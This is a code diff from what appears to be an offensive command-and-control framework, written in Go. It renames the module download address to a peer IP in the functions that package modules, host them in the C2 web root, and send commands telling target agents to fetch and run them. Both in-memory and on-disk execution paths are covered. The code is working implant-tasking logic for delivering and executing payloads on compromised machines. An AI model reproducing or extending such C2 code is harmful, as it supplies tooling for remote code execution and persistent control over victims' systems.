@@ -59,8 +59,8 @@ func moduleCustom(ctx *c2context.C2Context) {
 		return
 	}
 
-	// where to download the module, can be from C2 or other agents, see `listener`
-	download_addr := getDownloadAddr(ctx.Flags)
+	// where to download the module, can be from C2 or peer agents
+	peerIP := getPeerIP(ctx.Flags)
 
 	// agent side configs
 	payload_type := config.AgentConfig.Type
@@ -86,12 +86,12 @@ func moduleCustom(ctx *c2context.C2Context) {
 
 	// if in-memory module
 	if config.AgentConfig.InMemory {
-		handleInMemoryModule(ctx, *config, payload_type, invB64, download_addr)
+		handleInMemoryModule(ctx, *config, payload_type, invB64, peerIP)
 		return
 	}
 
 	// other modules that need to be saved to disk
-	handleCompressedModule(ctx, *config, payload_type, invB64, download_addr)
+	handleCompressedModule(ctx, *config, payload_type, invB64, peerIP)
 }
 
 // build_module builds a local module using `build.sh`, passing flags as args to `./build.sh`
@@ -123,14 +123,17 @@ func build_module(config *def.ModuleConfig, flags map[string]string) (out []byte
 	return out, err
 }
 
-func getDownloadAddr(flags map[string]string) string {
+func getPeerIP(flags map[string]string) string {
+	if val, ok := flags["peer"]; ok {
+		return val
+	}
 	if val, ok := flags["download_addr"]; ok {
 		return val
 	}
 	return ""
 }
 
-func handleInMemoryModule(ctx *c2context.C2Context, config def.ModuleConfig, payload_type, invocationB64, download_addr string) {
+func handleInMemoryModule(ctx *c2context.C2Context, config def.ModuleConfig, payload_type, invocationB64, peerIP string) {
 	hosted_file := live.WWWRoot + live.ActiveModule.Name + ".xz"
 	logging.Infof("Compressing %s with gzip...", live.ActiveModule.Name)
 
@@ -159,8 +162,8 @@ func handleInMemoryModule(ctx *c2context.C2Context, config def.ModuleConfig, pay
 	fileToDownload := filepath.Base(hosted_file)
 	cmd := fmt.Sprintf("%s --mod_name %s --type %s --file_to_download %s --checksum %s --in_mem --invocation %s",
 		def.C2CmdCustomModule, live.ActiveModule.Name, payload_type, fileToDownload, crypto.SHA256SumFile(hosted_file), strconv.Quote(invocationB64))
-	if download_addr != "" {
-		cmd += fmt.Sprintf(" --download_addr %s", strconv.Quote(download_addr))
+	if peerIP != "" {
+		cmd += fmt.Sprintf(" --peer %s", strconv.Quote(peerIP))
 	}
 	job_id := uuid.NewString()
 	logging.Debugf("Sending command %s to %s", cmd, ctx.Target.Tag)
@@ -170,7 +173,7 @@ func handleInMemoryModule(ctx *c2context.C2Context, config def.ModuleConfig, pay
 	}
 }
 
-func handleCompressedModule(ctx *c2context.C2Context, config def.ModuleConfig, payload_type, invocationB64, download_addr string) {
+func handleCompressedModule(ctx *c2context.C2Context, config def.ModuleConfig, payload_type, invocationB64, peerIP string) {
 	tarball_path := live.WWWRoot + live.ActiveModule.Name + ".tar.gz"
 	file_to_download := filepath.Base(tarball_path)
 	if !util.IsFileExist(tarball_path) {
@@ -191,8 +194,8 @@ func handleCompressedModule(ctx *c2context.C2Context, config def.ModuleConfig, p
 	cmd := fmt.Sprintf("%s --mod_name %s --checksum %s --invocation %s --type %s --file_to_download %s",
 		def.C2CmdCustomModule,
 		live.ActiveModule.Name, checksum, strconv.Quote(invocationB64), payload_type, file_to_download)
-	if download_addr != "" {
-		cmd += fmt.Sprintf(" --download_addr %s", strconv.Quote(download_addr))
+	if peerIP != "" {
+		cmd += fmt.Sprintf(" --peer %s", strconv.Quote(peerIP))
 	}
 	job_id := uuid.NewString()
 	err := CmdSender(cmd, job_id, ctx.Target.Tag)
